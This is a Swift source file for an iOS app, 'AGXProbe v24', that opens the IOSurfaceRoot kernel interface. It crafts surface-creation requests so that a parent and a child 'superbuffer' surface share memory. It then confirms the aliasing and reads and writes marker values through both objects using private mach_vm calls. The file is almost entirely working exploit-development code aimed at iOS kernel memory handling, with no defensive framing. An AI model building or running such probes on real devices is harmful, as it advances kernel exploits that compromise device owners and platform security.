import SwiftUI
import Darwin

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v24 — IOSurface alias confirm (17 Pro)").font(.headline)
            Text("parent/child superbuffer alias + cross-object R/W").font(.caption2).foregroundColor(.secondary)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v24")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    @_silgen_name("mach_vm_read_overwrite")
    private func mach_vm_read_overwrite(_ target: task_t, _ address: mach_vm_address_t,
                                        _ size: mach_vm_size_t, _ data: mach_vm_address_t,
                                        _ outsize: UnsafeMutablePointer<mach_vm_size_t>) -> kern_return_t
    @_silgen_name("mach_vm_write")
    private func mach_vm_write(_ target: task_t, _ address: mach_vm_address_t,
                               _ data: vm_offset_t, _ size: mach_msg_type_number_t) -> kern_return_t

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func log(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    private func xmlNul(_ d: Any) -> Data? {
        guard let data = try? PropertyListSerialization.data(fromPropertyList: d, format: .xml, options: 0) else { return nil }
        return data + Data([0])
    }

    private func stripNul(_ data: Data, tag: String) -> Data? {
        guard let s = String(data: data, encoding: .utf8) else { return nil }
        guard let a = s.range(of: "<\(tag)"),
              let b = s.range(of: "</\(tag)>", options: .backwards) else { return nil }
        return (String(s[a.lowerBound..<b.upperBound]).data(using: .utf8) ?? Data()) + Data([0])
    }

    private func num(_ v: UInt64) -> Int64 { Int64(bitPattern: v) }

    private func plane(off: UInt64, size: UInt64) -> [String: Any] {
        return [
            "IOSurfacePlaneWidth": 64,
            "IOSurfacePlaneHeight": 64,
            "IOSurfacePlaneBytesPerRow": 256,
            "IOSurfacePlaneBytesPerElement": 4,
            "IOSurfacePlaneOffset": num(off),
            "IOSurfacePlaneSize": num(size),
        ]
    }

    private func surf(_ alloc: UInt64, _ planes: [[String: Any]]) -> [String: Any] {
        return [
            "IOSurfaceWidth": 64,
            "IOSurfaceHeight": 64,
            "IOSurfaceBytesPerElement": 4,
            "IOSurfaceBytesPerRow": 256,
            "IOSurfaceAllocSize": num(alloc),
            "IOSurfacePixelFormat": 0x42475241,
            "IOSurfacePlaneInfo": planes,
        ]
    }

    private func call(conn: io_connect_t, sel: UInt32, tag: String, scalar: UInt64,
                      scalarCount: UInt32, payload: Data, outSize: Int) -> (UInt32, [UInt8]) {
        var inScalar: [UInt64] = [scalar]
        var outScalar: [UInt64] = [0]
        var outScalarCount: UInt32 = 0
        var out = [UInt8](repeating: 0xCC, count: max(outSize, 1))
        var outLen = outSize
        let kr: kern_return_t = payload.withUnsafeBytes { raw in
            out.withUnsafeMutableBytes { ob in
                IOConnectCallMethod(conn, sel,
                                    &inScalar, scalarCount,
                                    raw.baseAddress, payload.count,
                                    &outScalar, &outScalarCount,
                                    ob.baseAddress, &outLen)
            }
        }
        let u = UInt32(bitPattern: kr)
        var hex = ""
        for i in 0..<min(0x40, out.count) {
            if i % 16 == 0 { hex += String(format: "\n    %04x: ", i) }
            hex += String(format: "%02x ", out[i])
        }
        log(String(format: "%@ sel=%u scalar=%llu kr=0x%08x in=%lu outLen=0x%x%@",
                   tag, sel, scalar, u, payload.count, outLen, hex))
        return (u, out)
    }

    private func create(conn: io_connect_t, tag: String, parent: UInt32, _ d: [String: Any]) -> [UInt8]? {
        guard let full = xmlNul(d), let p = stripNul(full, tag: "dict") else {
            log("\(tag): serialize failed"); return nil
        }
        let (kr, out) = call(conn: conn, sel: 0, tag: tag, scalar: UInt64(parent), scalarCount: 1, payload: p, outSize: 0xC68)
        return kr == 0 ? out : nil
    }

    private func idFrom(_ out: [UInt8]) -> UInt32? {
        guard out.count >= 0x1C else { return nil }
        return UInt32(out[0x18]) | (UInt32(out[0x19]) << 8) | (UInt32(out[0x1A]) << 16) | (UInt32(out[0x1B]) << 24)
    }

    private func u64(_ out: [UInt8], _ o: Int) -> UInt64 {
        guard out.count >= o + 8 else { return 0 }
        var v: UInt64 = 0
        for i in 0..<8 { v |= UInt64(out[o + i]) << (8 * i) }
        return v
    }

    private func read8(_ addr: UInt64) -> UInt64? {
        guard addr != 0 else { return nil }
        var buf: UInt64 = 0
        var outSz: mach_vm_size_t = 0
        let kr: kern_return_t = withUnsafeMutableBytes(of: &buf) { raw in
            mach_vm_read_overwrite(mach_task_self_, mach_vm_address_t(addr), 8,
                                   mach_vm_address_t(UInt(bitPattern: raw.baseAddress)), &outSz)
        }
        return kr == KERN_SUCCESS ? buf : nil
    }

    private func write8(_ addr: UInt64, _ val: UInt64) -> Bool {
        guard addr != 0 else { return false }
        let buf = [val]
        return buf.withUnsafeBytes { raw in
            mach_vm_write(mach_task_self_, mach_vm_address_t(addr),
                          vm_offset_t(UInt(bitPattern: raw.baseAddress)), mach_msg_type_number_t(8)) == KERN_SUCCESS
        }
    }

    private func rwtest(_ tag: String, _ addr: UInt64) {
        guard let v = read8(addr) else {
            log("  \(tag): read8 0x\(String(addr, radix: 16)) FAIL"); return
        }
        log("  \(tag): read8 0x\(String(addr, radix: 16)) = 0x\(String(v, radix: 16))")
    }

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        log("=== AGXProbe v24 — IOSurface alias confirm (17 Pro) ===")

        let service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot"))
        guard service != 0 else { log("IOSurfaceRoot service = NULL"); status = "Failed"; isRunning = false; return }
        defer { IOObjectRelease(service) }
        var conn: io_connect_t = 0
        let okr = IOServiceOpen(service, mach_task_self_, 0, &conn)
        log(String(format: "IOServiceOpen type=0 kr=0x%x conn=0x%x", okr, conn))
        guard okr == 0 else { status = "Failed"; isRunning = false; return }
        defer { IOServiceClose(conn) }

        guard let po = create(conn: conn, tag: "P parent", parent: 0, surf(0x4000, [plane(off: 0, size: 0x4000)])),
              let pid = idFrom(po) else { log("parent failed"); status = "Failed"; isRunning = false; return }
        let pa0 = u64(po, 0x00)
        log(String(format: "P id=%u a0=0x%llx", pid, pa0))

        var c: [String: Any] = surf(0x4000, [plane(off: 0, size: 0x4000)])
        c["IOSurfaceAllocateFromSuperbuffer"] = 1
        guard let co = create(conn: conn, tag: "C child off0", parent: pid, c), let cid = idFrom(co) else {
            log("child failed"); status = "Failed"; isRunning = false; return
        }
        let ca0 = u64(co, 0x00)
        log(String(format: "C id=%u a0=0x%llx", cid, ca0))

        log("ALIAS: \(pa0 == ca0 ? "CONFIRMED parent==child" : "NOT aliased (P=0x\(String(pa0, radix:16)) C=0x\(String(ca0, radix:16))")")

        // cross-object R/W
        log("write8 P a0 = 0x4141414141414141  -> \(write8(pa0, 0x4141414141414141))")
        rwtest("via P", pa0)
        rwtest("via C", ca0)

        log("write8 C a0 = 0x4242424242424242  -> \(write8(ca0, 0x4242424242424242))")
        rwtest("via P", pa0)
        rwtest("via C", ca0)

        log("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}
